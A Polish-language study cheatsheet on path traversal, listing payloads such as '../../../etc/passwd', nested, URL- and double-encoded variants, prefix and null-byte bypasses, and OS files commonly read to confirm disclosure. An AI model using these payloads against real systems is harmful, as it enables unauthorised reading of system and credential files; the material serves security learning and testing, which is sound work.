# Payloads and Bypasses Cheatsheet

## Typowe wzorce payloadów

| Sytuacja | Idea payloadu | Przykład | Dlaczego działa |
|---|---|---|---|
| Basic traversal | Idź katalogami w górę | `../../../etc/passwd` | Wychodzi poza base directory |
| Absolute path accepted | Użyj pełnej ścieżki | `/etc/passwd` | Nie trzeba `../` |
| `../` usuwane raz | Nested traversal | `....//....//etc/passwd` | Słaby filtr może stworzyć `../` po usunięciu |
| URL encoding | Zakoduj znaki traversal | `%2e%2e%2f` | Omija filtry sprawdzające raw input |
| Double encoding | Zakoduj sam `%` | `..%252f..%252fetc%252fpasswd` | Pierwszy decode daje `%2f`, drugi daje `/` |
| Required base path | Zacznij od dozwolonej ścieżki | `/var/www/images/../../../etc/passwd` | Przechodzi słaby prefix check |
| Appended extension | Null byte, stare PHP | `../../etc/passwd%00` | Historycznie ucinało suffix typu `.php` |

## Basic traversal

```txt
../../../etc/passwd
```

Przechodzi katalogami w górę aż do miejsca, z którego można dojść do `/etc/passwd`.

## Typowe pliki testowe per system operacyjny

| OS | Typowy plik testowy | Dlaczego jest przydatny |
|---|---|---|
| Linux | `/etc/passwd` | Zwykle istnieje, często jest czytelny i łatwo go rozpoznać |
| Linux | `/etc/hosts` | Zwykle jest czytelny i potwierdza lokalny odczyt pliku |
| Linux | `/proc/version` | Może ujawnić informacje o kernelu/wersji systemu |
| Linux | `/etc/issue` | Może ujawnić informacje o systemie/bannerze |
| Windows | `C:\Windows\win.ini` | Klasyczny test file dla Windows file disclosure |
| Windows | `C:\boot.ini` | Starszy plik konfiguracji bootowania Windows |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | Windowsowy plik hosts |

## Absolute path

```txt
/etc/passwd
```

Nie trzeba traversal, jeśli backend akceptuje pełne ścieżki filesystemu.

## Nested traversal

```txt
....//....//....//etc/passwd
```

Może obejść filtry, które usuwają `../` tylko raz.

Koncepcyjnie:

```txt
....// -> po słabym usuwaniu -> ../
```

Najważniejsza lekcja: non-recursive string replacement nie jest wiarygodną ochroną.

## URL encoding

```txt
../ -> %2e%2e%2f
```

Niektóre filtry szukają surowego `../`, ale aplikacja albo framework może później zdekodować input.

## Double URL encoding

```txt
%252f -> %2f -> /
```

Przykład:

```txt
..%252f..%252f..%252fetc%252fpasswd
```

Po pierwszym decode:

```txt
..%2f..%2f..%2fetc%2fpasswd
```

Po drugim decode:

```txt
../../../etc/passwd
```

Double encoding może ukryć traversal przed wcześniejszą warstwą walidacji, jeśli aplikacja później dekoduje input jeszcze raz.

## Required base path bypass

Jeśli aplikacja wymaga, żeby input zaczynał się od:

```txt
/var/www/images/
```

słaby check można obejść tak:

```txt
/var/www/images/../../../etc/passwd
```

Raw input zaczyna się od oczekiwanej ścieżki, ale finalna resolved path może wyjść poza katalog.

## Appended extension bypass

Jeśli aplikacja dokleja rozszerzenie:

```php
include($_GET["file"] . ".php");
```

to:

```txt
../../../../etc/passwd
```

może stać się:

```txt
../../../../etc/passwd.php
```

W starych wersjach PHP null byte `%00` mógł czasem uciąć ścieżkę przed doklejonym rozszerzeniem:

```txt
../../../../etc/passwd%00
```

To historyczny bypass i nie powinno się oczekiwać, że działa w nowoczesnym PHP.

## Notatka dla mnie

Payloady mają głównie odpowiedzieć na jedno pytanie: czy backend znormalizował i sprawdził prawdziwą ścieżkę przed odczytem pliku?
